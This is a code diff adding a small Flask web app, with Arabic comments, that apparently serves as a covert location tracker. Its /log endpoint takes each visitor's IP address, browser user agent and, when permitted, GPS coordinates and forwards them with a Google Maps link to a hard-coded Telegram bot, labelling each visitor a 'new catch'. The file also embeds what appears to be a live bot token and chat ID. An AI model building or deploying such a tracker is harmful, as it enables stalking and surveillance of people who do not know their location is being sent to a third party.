@@ -1,0 +1,44 @@
+from flask import Flask, render_template, request, jsonify
+import requests
+
+app = Flask(__name__)
+
+# بياناتك الشخصية التي أحضرناها سابقاً
+TELEGRAM_TOKEN = '8504868188:AAHMKi5FN0L-ALvC24f0Xivp2ZOdqlK59r0'
+CHAT_ID = '8139456582'
+
+def send_to_telegram(message):
+    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
+    payload = {"chat_id": CHAT_ID, "text": message, "parse_mode": "Markdown"}
+    try:
+        requests.post(url, json=payload, timeout=10)
+    except:
+        pass
+
+@app.route('/')
+def index():
+    return render_template('index.html')
+
+@app.route('/log', methods=['POST'])
+def log_data():
+    data = request.json
+    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    user_agent = request.headers.get('User-Agent')
+    
+    if data.get('status') == "Allowed":
+        lat, lon = data.get('lat'), data.get('lon')
+        msg = (f"🎯 *صيد جديد (GPS)!*\n\n"
+               f"📱 *الجهاز:* `{user_agent}`\n"
+               f"🌐 *IP:* `{ip}`\n"
+               f"📍 *الموقع:* `{lat}, {lon}`\n"
+               f"🗺️ [فتح في خرائط جوجل](http://maps.google.com/maps?q={lat},{lon})")
+    else:
+        msg = (f"⚠️ *شخص دخل ورفض مشاركة الموقع*\n\n"
+               f"📱 *الجهاز:* `{user_agent}`\n"
+               f"🌐 *IP:* `{ip}`")
+    
+    send_to_telegram(msg)
+    return jsonify({"status": "success"})
+
+if __name__ == '__main__':
+    app.run()
